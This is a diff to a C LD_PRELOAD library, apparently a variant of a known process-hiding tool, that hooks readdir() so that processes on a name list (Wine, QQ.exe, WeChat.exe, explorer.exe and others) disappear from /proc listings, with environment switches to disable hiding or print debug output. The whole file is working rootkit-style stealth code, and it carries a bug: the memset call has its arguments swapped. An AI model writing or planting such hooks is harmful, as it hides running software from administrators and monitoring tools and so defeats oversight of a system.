@@ -1,16 +1,36 @@
 #define _GNU_SOURCE
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdarg.h>
 
+typedef struct psinfo {
+char pid[32];;
+char pname[1024];
+char owner[128];
+} PSINFO;
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static char* g_showall = NULL;
+static char* g_dbg = NULL;
+static const char* process_to_filter[] = {
+"wineserver",
+"QQ.exe",
+"WeChat.exe",
+"explorer.exe",
+"services.exe",
+"winedevice.exe",
+"plugplay.exe",
+"winedevice.exe",
+NULL
+};
 
+PSINFO ps;
 /*
  * Get a directory name given a DIR* handle
  */
@@ -32,16 +52,55 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
     return 1;
 }
 
+void DEBUG(char *fmt, ...) {
+    char buf[1024 * 2] = { '\0' };
+    char *jestrace;
+    static int trace_init = -1;
+    va_list args;
+
+    if (trace_init == -1) {
+        if ((jestrace = getenv("MYDBG_SHOWDBG")) != NULL && strcmp(jestrace, "DEBUG") == 0) {
+            trace_init = 1;
+        } else {
+            trace_init = 0;
+        }
+    }
+    if (trace_init == 1) {
+        va_start(args, fmt);
+        vsnprintf(buf, sizeof(buf), fmt, args);
+        va_end(args); 
+        printf("DEBUG:%s\n", buf);
+    }
+}
+
+
+/*
+ * check if hide
+ */
+static int isToHide(PSINFO* ps)
+{
+	DEBUG("isToHide: dirname_in=%s", ps->pname);
+	if (NULL != g_showall && strcmp(g_showall, "yes") == 0 ) return 0;
+	int i=0;
+	while (process_to_filter[i] != NULL) {
+		DEBUG("ps->pname=%s process_to_filter[%d]=%s", ps->pname, i, process_to_filter[i]);
+		if (strcmp(ps->pname, process_to_filter[i]) == 0 ) {
+			return 1;
+		}
+		i++;
+	}
+    return 0;
+}
 /*
  * Get a process name given its pid
  */
-static int get_process_name(char* pid, char* buf)
+static int get_process_info(char* pid, PSINFO* ps)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
         return 0;
     }
 
-    char tmp[256];
+    char tmp[1024];
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
  
     FILE* f = fopen(tmp, "r");
@@ -57,7 +116,7 @@ static int get_process_name(char* pid, char* buf)
     fclose(f);
 
     int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    sscanf(tmp, "%d (%[^)]s", &unused, ps->pname);
     return 1;
 }
 
@@ -66,6 +125,8 @@ static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
 struct dirent* readdir(DIR *dirp)                                       \
 {                                                                       \
+	g_showall=getenv("MYDBG_SHOWALL");                                  \
+	g_dbg=getenv("MYDBG_SHOWDBG");                                      \
     if(original_##readdir == NULL) {                                    \
         original_##readdir = dlsym(RTLD_NEXT, "readdir");               \
         if(original_##readdir == NULL)                                  \
@@ -81,11 +142,11 @@ struct dirent* readdir(DIR *dirp)                                       \
         dir = original_##readdir(dirp);                                 \
         if(dir) {                                                       \
             char dir_name[256];                                         \
-            char process_name[256];                                     \
+			memset(&ps, sizeof(ps), 0x0);                               \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                get_process_info(dir->d_name, &ps) &&                   \
+                isToHide(&ps) == 1) {                                   \
                 continue;                                               \
             }                                                           \
         }                                                               \
